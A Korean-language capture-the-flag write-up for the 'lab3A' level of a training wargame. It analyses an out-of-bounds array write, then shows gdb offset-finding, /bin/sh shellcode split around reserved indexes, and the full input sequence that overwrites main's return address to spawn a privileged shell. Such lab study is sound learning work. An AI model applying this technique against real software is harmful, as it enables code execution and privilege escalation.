## 1. 문제 확인
- ID : lab3A
- Target : /level/lab03/lab3A
- flag : /home/lab3end/.pass
```
	lab3A@warzone:/levels/lab03$ ./lab3A
	----------------------------------------------------
  	Welcome to quend's crappy number storage service!
	----------------------------------------------------
 	Commands:
    	store - store a number into the data storage
    	read  - read a number from the data storage
    	quit  - exit the program
	----------------------------------------------------
   		quend has reserved some storage for herself :>
	----------------------------------------------------

	Input command: store
 	Number: 123456790123456789
 	Index: 1
 	Completed store command successfully
	Input command: read
 	Index: 1
 	Number at data[1] is 4294967295
 	Completed read command successfully
    Input command: read
 	Index: 1234567890123456789
 	Number at data[4294967295] is 3221222712
 	Completed read command successfully
	Input command: g4nzzig4nzzig4nzzi
 	Failed to do g4nzzig4nzzig4nzzi command
	Input command:
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
```c
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>
	#include "utils.h"

	#define STORAGE_SIZE 100

	/* gcc -Wall -z execstack -o lab3A lab3A.c */

	/* get a number from the user and store it */
	int store_number(unsigned int * data)
	{
    	unsigned int input = 0;
    	unsigned int index = 0;

    	/* get number to store */
    	printf(" Number: ");
    	input = get_unum();

    	/* get index to store at */
    	printf(" Index: ");
    	index = get_unum();

    	/* make sure the slot is not reserved */
    	if(index % 3 == 0 || (input >> 24) == 0xb7)
    	{
        	printf(" *** ERROR! ***\n");
        	printf("   This index is reserved for quend!\n");
        	printf(" *** ERROR! ***\n");

        	return 1;
    	}

    	/* save the number to data storage */
    	data[index] = input;

    	return 0;
	}

	/* returns the contents of a specified storage index */
	int read_number(unsigned int * data)
	{
    	unsigned int index = 0;

    	/* get index to read from */
    	printf(" Index: ");
    	index = get_unum();

    	printf(" Number at data[%u] is %u\n", index, data[index]);

    	return 0;
	}

	int main(int argc, char * argv[], char * envp[])
	{
    	int res = 0;
    	char cmd[20] = {0};
    	unsigned int data[STORAGE_SIZE] = {0};

    	/* doom doesn't like enviroment variables */
    	clear_argv(argv);
    	clear_envp(envp);

    	printf("----------------------------------------------------\n"\
				"  Welcome to quend's crappy number storage service!  \n"\
           		"----------------------------------------------------\n"\
           		" Commands:                                          \n"\
           		"    store - store a number into the data storage    \n"\
           		"    read  - read a number from the data storage     \n"\
           		"    quit  - exit the program                        \n"\
           		"----------------------------------------------------\n"\
           		"   quend has reserved some storage for herself :>    \n"\
           		"----------------------------------------------------\n"\
           		"\n");


    	/* command handler loop */
    	while(1)
    	{
        	/* setup for this loop iteration */
        	printf("Input command: ");
        	res = 1;

        	/* read user input, trim newline */
        	fgets(cmd, sizeof(cmd), stdin);
        	cmd[strlen(cmd)-1] = '\0';

        	/* select specified user command */
        	if(!strncmp(cmd, "store", 5))
            	res = store_number(data);
        	else if(!strncmp(cmd, "read", 4))
            	res = read_number(data);
        	else if(!strncmp(cmd, "quit", 4))
            	break;

        	/* print the result of our command */
        	if(res)
            	printf(" Failed to do %s command\n", cmd);
        	else
            	printf(" Completed %s command successfully\n", cmd);

        	memset(cmd, 0, sizeof(cmd));
    	}

    	return EXIT_SUCCESS;
	}
```
### 2.2 Code 분석
#### 2.2.1 main()
- 400byte 크기의 data 배열이 선언되고, 프로그램 파라미터(argv)와 환경변수(envp)를 초기화 함
```c
  	unsigned int data[STORAGE_SIZE] = {0};
  	...
    /* doom doesn't like enviroment variables */
    clear_argv(argv);
    clear_envp(envp);
    ...
```
#### 2.2.2 store_number()
- data 배열을 인자로 넘겨받아 data 의 index 위치에 input 값을 입력함
  (get_unum() 함수를 통해 입력받은 값의 크기를 체크하지 않아 overflow 발생)
```c
	int store_number(unsigned int * data)
	{
    ...
    /* get number to store */
    printf(" Number: ");
    input = get_unum();

    /* get index to store at */
    printf(" Index: ");
    index = get_unum();
    ...
    /* save the number to data storage */
    data[index] = input;
```
- index 값은 3으로 나누어 떨어지지만 않으면 입력값 크기에 제한이 없음
  (※ input 체크값 0xb7은 main() 함수의 리턴 주소 시작범위, 예) : 0xb7e3ca83)
```c
	  if(index % 3 == 0 || (input >> 24) == 0xb7)
    {
    ...
```
### 2.3 공격 포인트 분석
#### 2.3.1 main() 리턴주소 위치
- main()에서 store_number()호출 시 전달되는 data 배열의 주소와 main()종료 시 리턴 주소를 확인하기 위해 각 코드 부분에 breakpoint 설정 후 실행함
```
	lab3A@warzone:/levels/lab03$ gdb -q lab3A
	Reading symbols from lab3A...(no debugging symbols found)...done.
	gdb-peda$ disas main
	Dump of assembler code for function main:
    	0x08048a12 <+0>:     push   ebp
   		0x08048a13 <+1>:     mov    ebp,esp
   		0x08048a15 <+3>:     push   edi
   		0x08048a16 <+4>:     push   ebx
   		0x08048a17 <+5>:     and    esp,0xfffffff0
   		0x08048a1a <+8>:     sub    esp,0x1c0
      ...
      0x08048b60 <+334>:   lea    eax,[esp+0x18]
   		0x08048b64 <+338>:   mov    DWORD PTR [esp],eax
   		0x08048b67 <+341>:   call   0x8048917 <store_number>
   		0x08048b6c <+346>:   mov    DWORD PTR [esp+0x1bc],eax
      ...
      0x08048c38 <+550>:   pop    ebx
   		0x08048c39 <+551>:   pop    edi
   		0x08048c3a <+552>:   pop    ebp
   		0x08048c3b <+553>:   ret
  End of assembler dump.
	gdb-peda$ b *0x8048b67
	Breakpoint 1 at 0x8048b67
	gdb-peda$ b *0x08048c3b
	Breakpoint 2 at 0x8048c3b
```
- store_number() 호출 시점의 stack을 확인해보면 data 배열의 주소가 0xbffff528 임
```
	gdb-peda$ r
	Starting program: /levels/lab03/lab3A
	----------------------------------------------------
  Welcome to quend's crappy number storage service!
	----------------------------------------------------
 	Commands:
    	store - store a number into the data storage
    	read  - read a number from the data storage
    	quit  - exit the program
	----------------------------------------------------
  quend has reserved some storage for herself :>
	----------------------------------------------------
	
	Input command: store
  ...
	[-------------------------------------code-------------------------------------]
   		0x8048b5e <main+332>:        jne    0x8048b75 <main+355>
   		0x8048b60 <main+334>:        lea    eax,[esp+0x18]
   		0x8048b64 <main+338>:        mov    DWORD PTR [esp],eax
	 => 0x8048b67 <main+341>:        call   0x8048917 <store_number>
   		0x8048b6c <main+346>:        mov    DWORD PTR [esp+0x1bc],eax
   		0x8048b73 <main+353>:        jmp    0x8048bd2 <main+448>
   		0x8048b75 <main+355>:        mov    DWORD PTR [esp+0x8],0x4
   		0x8048b7d <main+363>:        mov    DWORD PTR [esp+0x4],0x8048f63
	Guessed arguments:
	arg[0]: 0xbffff528 --> 0x0
	[------------------------------------stack-------------------------------------]
	0000| 0xbffff510 --> 0xbffff528 --> 0x0
	0004| 0xbffff514 --> 0x8048f5d ("store")
	0008| 0xbffff518 --> 0x5
	0012| 0xbffff51c --> 0x0
	0016| 0xbffff520 --> 0xb7fff55c --> 0xb7fde000 --> 0x464c457f
	0020| 0xbffff524 --> 0xbffff588 --> 0x0
	0024| 0xbffff528 --> 0x0
	0028| 0xbffff52c --> 0x0
	[------------------------------------------------------------------------------]
```
- main() 종료 시점의 stack을 확인해 보면 리턴주소가 0xbffff6dc 에 저장되어 있음
```
	gdb-peda$ c
	Continuing.
 	Number: 1234567
 	Index: 1
 	Completed store command successfully
	Input command: quit
	...
	[-------------------------------------code-------------------------------------]
   		0x8048c38 <main+550>:        pop    ebx
   		0x8048c39 <main+551>:        pop    edi
   		0x8048c3a <main+552>:        pop    ebp
	 => 0x8048c3b <main+553>:        ret
   		0x8048c3c:   xchg   ax,ax
   		0x8048c3e:   xchg   ax,ax
   		0x8048c40 <__libc_csu_init>: push   ebp
   		0x8048c41 <__libc_csu_init+1>:       push   edi
	[------------------------------------stack-------------------------------------]
	0000| 0xbffff6dc --> 0xb7e3ca83 (<__libc_start_main+243>:       mov    DWORD PTR [esp],eax)
	0004| 0xbffff6e0 --> 0x1
	0008| 0xbffff6e4 --> 0xbffff778 --> 0x0
	0012| 0xbffff6e8 --> 0xbffff7d8 --> 0x0
	0016| 0xbffff6ec --> 0xb7feccea (<call_init+26>:        add    ebx,0x12316)
	0020| 0xbffff6f0 --> 0x1
	0024| 0xbffff6f4 --> 0xbffff774 --> 0xbffff8a0 --> 0x0
	0028| 0xbffff6f8 --> 0xbffff714 --> 0xc3e8114a
	[------------------------------------------------------------------------------]
```
- 따라서 main() 함수의 리턴주소는 data 배열의 시작 위치로부터 436byte (0xbffff6dc - 0xbffff528) 떨어진 위치에 저장되어 있음
#### 2.3.2 쉘코드 배치
- data 배열의 index 마다 쉘코드를 저장하면 되는데, index값이 3으로 나누어 떨어지면 저장이 불가능하기 때문에 2개의 값(8byte)마다 쉘코드를 입력한 이후 4byte는 건너뛰는 방식을 사용
```
	[ NULL ][ 4byte ][ 4byte ][ NULL ][ 4byte ][ 4byte ][ NULL ]...[ 4byte ]
   data[0] data[1]  data[2]  data[3] data[4]  data[5]  data[6]   (ret 주소)
```
- data 배열에 쉘코드(4byte) + 쉘코드(2byte) + 4byte jump코드(2byte) 조합으로 반복해서 채워주고, 436byte 떨어진 data[109] 위치에 쉘코드 시작 위치(data[1]) 주소를 채움
```
	|---------------------------  (436 byte)  -----------------------------|
	[ NULL ][ 쉘코드 ][ 쉘코드+jmp ][ NULL ][ 쉘코드 ][ 쉘코드+jmp ][ NULL ]...[ data[1] 주소 ]
   data[0]  data[1]    data[2]    data[3]  data[4]   data[5]    data[6]       data[109]
```
#### 2.3.3 쉘코드 준비
- 쉘코드는 6byte 크기로 정렬하고 4byte jump코드(eb 04)를 추가하여 8byte 단위로 만듬 
```
	31 c0                 xor    eax, eax
	50                    push   eax
	68 2f 2f 73 68        push   0x68732f2f
	68 2f 62 69 6e        push   0x6e69622f
	89 e3                 mov    ebx, esp
	89 c1                 mov    ecx, eax
	89 c2                 mov    edx, eax
	b0 0b                 mov    al, 0xb
	cd 80                 int    0x80
```
```
	31 c0 50 90 90 90 eb 04	
	68 2f 2f 73 68 90 eb 04	
	68 2f 62 69 6e 90 eb 04	
	89 e3 89 c1 89 c2 eb 04	
	b0 0b cd 80	
```
- store 명령으로 입력하기 위해 다시 4byte 단위로 분리한 후 10진수(Little-Endian) 형태로 변환
```
	31 c0 50 90	=>	0x9050c031	==>	2421211185
  90 90 eb 04	=>	0x04eb9090	==>	82546832
	68 2f 2f 73 =>	0x732f2f68	==>	1932472168
  68 90 eb 04	=>	0x04eb9068	==>	82546792
	68 2f 62 69 =>	0x69622f68	==>	1768042344
  6e 90 eb 04	=>	0x04eb906e	==>	82546798
	89 e3 89 c1 =>	0xc189e389	==>	3247039369
  89 c2 eb 04	=>	0x04ebc289	==>	82559625
	b0 0b cd 80	=>	0x80cd0bb0	==>	2160921520
````
- data 배열의 앞부분에는 NOP-Sled 코드를 추가하고, data[109](리턴주소 위치)에는 data[1]의 주소로 덮어씀
  (※ 실행환경의 차이로 인해 디버깅 시 data[1] 주소와 일반 실행 시 data[1] 주소는 차이가 있음)
```
	[NOP sled]
	90 90 90 90	=>	0x90909090	==>	2425393296
  90 90 eb 04	=>	0x04eb9090	==>	82546832
    
  [data[1] 주소]
	0xbffff50c	==> 3221222668
```

<br/><br/>
## 3. Exploit
- 준비된 코드를 4byte 단위로 data 배열에 저장하고 main()함수 리턴주소를 data[1] 주소로 덮어쓰면 쉘코드가 실행됨
```
	lab3A@warzone:/levels/lab03$ ./lab3A
	----------------------------------------------------
   Welcome to quend's crappy number storage service!
	----------------------------------------------------
 	Commands:
    	store - store a number into the data storage
    	read  - read a number from the data storage
    	quit  - exit the program
	----------------------------------------------------
   quend has reserved some storage for herself :>
	----------------------------------------------------
	
	Input command: store
 	Number: 2425393296
 	Index: 1
 	Completed store command successfully
	Input command: store
 	Number: 82546832
 	Index: 2
 	Completed store command successfully
	Input command: store
 	Number: 2425393296
 	Index: 4
 	Completed store command successfully
	Input command: store
 	Number: 82546832
 	Index: 5
 	Completed store command successfully
	Input command: store
 	Number: 2425393296
 	Index: 7
 	Completed store command successfully
	Input command: store
 	Number: 82546832
 	Index: 8
 	Completed store command successfully
	Input command: store
 	Number: 2425393296
 	Index: 10
 	Completed store command successfully
	Input command: store
 	Number: 82546832
 	Index: 11
 	Completed store command successfully
	Input command: store
 	Number: 2425393296
 	Index: 13
 	Completed store command successfully
	Input command: store
 	Number: 82546832
 	Index: 14
 	Completed store command successfully
	Input command: store
 	Number: 2421211185
 	Index: 16
 	Completed store command successfully
	Input command: store
 	Number: 82546832
 	Index: 17
 	Completed store command successfully
	Input command: store
 	Number: 1932472168
 	Index: 19
 	Completed store command successfully
	Input command: store
 	Number: 82546792
 	Index: 20
 	Completed store command successfully
	Input command: store
 	Number: 1768042344
 	Index: 22
 	Completed store command successfully
	Input command: store
 	Number: 82546798
 	Index: 23
 	Completed store command successfully
	Input command: store
 	Number: 3247039369
 	Index: 25
 	Completed store command successfully
	Input command: store
 	Number: 82559625
 	Index: 26
 	Completed store command successfully
	Input command: store
 	Number: 2160921520
 	Index: 28
 	Completed store command successfully
    Input command: store
 	Number: 3221222668
 	Index: 109
 	Completed store command successfully
	Input command: quit
	$ id
	uid=1012(lab3A) gid=1013(lab3A) euid=1013(lab3end) groups=1014(lab3end),1001(gameuser),1013(lab3A)
	$ 
```
